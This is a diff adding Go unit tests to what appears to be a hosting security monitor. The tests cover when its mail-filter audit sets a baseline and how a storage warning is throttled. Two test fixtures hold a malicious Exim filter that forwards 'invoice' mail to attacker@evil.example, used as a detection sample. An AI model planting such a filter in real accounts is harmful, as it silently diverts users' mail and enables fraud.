@@ -10,6 +10,7 @@ import (
 
 	"github.com/pidginhost/csm/internal/alert"
 	"github.com/pidginhost/csm/internal/config"
+	"github.com/pidginhost/csm/internal/state"
 	"github.com/pidginhost/csm/internal/store"
 )
 
@@ -598,6 +599,114 @@ endif
 	}
 }
 
+func TestCheckMailFiltersDoesNotBaselinePartialScan(t *testing.T) {
+	db := withTestStore(t)
+	now := time.Date(2026, 6, 4, 12, 0, 0, 0, time.UTC)
+	oldPath := "/home/olduser/etc/example.com/legacy/filter"
+	recentPath := "/home/recentuser/etc/example.com/recent/filter"
+	content := `# Exim filter
+if
+ $header_subject: contains "invoice"
+then
+ deliver attacker@evil.example
+endif
+`
+
+	withMockOS(t, &mockOS{
+		glob: func(pattern string) ([]string, error) {
+			if pattern == filepath.Join("/home", "*", "etc", "*", "*", "filter") {
+				return []string{oldPath, recentPath}, nil
+			}
+			return nil, nil
+		},
+		stat: mtimesByPath(map[string]time.Time{
+			oldPath:    now.Add(-time.Hour),
+			recentPath: now,
+		}),
+		readFile: func(name string) ([]byte, error) {
+			switch name {
+			case "/etc/localdomains":
+				return []byte("example.com\n"), nil
+			case oldPath, recentPath:
+				return []byte(content), nil
+			}
+			return nil, os.ErrNotExist
+		},
+	})
+
+	cfg := &config.Config{}
+	cfg.Thresholds.AccountScanMaxFiles = 1
+	if findings := CheckMailFilters(context.Background(), cfg, nil); len(findings) != 0 {
+		t.Fatalf("partial pre-baseline scan findings = %+v, want none", findings)
+	}
+	if got := db.GetMetaString("email:mailfilter_last_refresh"); got != "" {
+		t.Fatalf("partial scan set baseline marker %q, want empty", got)
+	}
+
+	cfg.Thresholds.AccountScanMaxFiles = 0
+	findings := CheckMailFilters(context.Background(), cfg, nil)
+	for _, f := range findings {
+		if f.Check == "email_filter_forwarder" {
+			t.Fatalf("filter skipped before first complete audit must stay silent: %+v", f)
+		}
+	}
+	if got := db.GetMetaString("email:mailfilter_last_refresh"); got == "" {
+		t.Fatal("complete scan did not set baseline marker")
+	}
+}
+
+func TestCheckMailFiltersDoesNotBaselineUnreadableFile(t *testing.T) {
+	db := withTestStore(t)
+	now := time.Date(2026, 6, 4, 12, 0, 0, 0, time.UTC)
+	path := "/home/victim/etc/example.com/sales/filter"
+	content := `# Exim filter
+if
+ $header_subject: contains "invoice"
+then
+ deliver attacker@evil.example
+endif
+`
+	readable := false
+
+	withMockOS(t, &mockOS{
+		glob: func(pattern string) ([]string, error) {
+			if pattern == filepath.Join("/home", "*", "etc", "*", "*", "filter") {
+				return []string{path}, nil
+			}
+			return nil, nil
+		},
+		stat: mtimesByPath(map[string]time.Time{path: now}),
+		readFile: func(name string) ([]byte, error) {
+			switch {
+			case name == "/etc/localdomains":
+				return []byte("example.com\n"), nil
+			case name == path && readable:
+				return []byte(content), nil
+			default:
+				return nil, os.ErrPermission
+			}
+		},
+	})
+
+	if findings := CheckMailFilters(context.Background(), &config.Config{}, nil); len(findings) != 0 {
+		t.Fatalf("unreadable pre-baseline filter findings = %+v, want none", findings)
+	}
+	if got := db.GetMetaString("email:mailfilter_last_refresh"); got != "" {
+		t.Fatalf("unreadable filter set baseline marker %q, want empty", got)
+	}
+
+	readable = true
+	findings := CheckMailFilters(context.Background(), &config.Config{}, nil)
+	for _, f := range findings {
+		if f.Check == "email_filter_forwarder" {
+			t.Fatalf("filter unreadable during first audit must stay silent once readable: %+v", f)
+		}
+	}
+	if got := db.GetMetaString("email:mailfilter_last_refresh"); got == "" {
+		t.Fatal("complete mail-filter scan did not set baseline marker")
+	}
+}
+
 // An account-scoped scan only hashes that account's filter files; it must
 // not set the global completion marker, or the next full scan would treat
 // every other account's existing filters as newly created.
@@ -632,6 +741,30 @@ func TestCheckMailFiltersWarnsWhenStoreUnavailable(t *testing.T) {
 	findings := CheckMailFilters(context.Background(), &config.Config{}, nil)
 	if len(findings) != 1 || findings[0].Severity != alert.Warning {
 		t.Fatalf("findings = %+v, want one warning about unavailable store", findings)
+	}
+}
+
+func TestCheckMailFiltersStoreUnavailableWarningUsesStateThrottle(t *testing.T) {
+	prev := store.Global()
+	store.SetGlobal(nil)
+	t.Cleanup(func() { store.SetGlobal(prev) })
+
+	st, err := state.Open(t.TempDir())
+	if err != nil {
+		t.Fatal(err)
+	}
+	t.Cleanup(func() { _ = st.Close() })
+
+	cfg := &config.Config{}
+	cfg.EmailProtection.PasswordCheckIntervalMin = 60
+
+	first := CheckMailFilters(context.Background(), cfg, st)
+	if len(first) != 1 || first[0].Check != "email_mail_filters" {
+		t.Fatalf("first findings = %+v, want one store-unavailable warning", first)
+	}
+	second := CheckMailFilters(context.Background(), cfg, st)
+	if len(second) != 0 {
+		t.Fatalf("second findings = %+v, want throttled store-unavailable warning", second)
 	}
 }
 
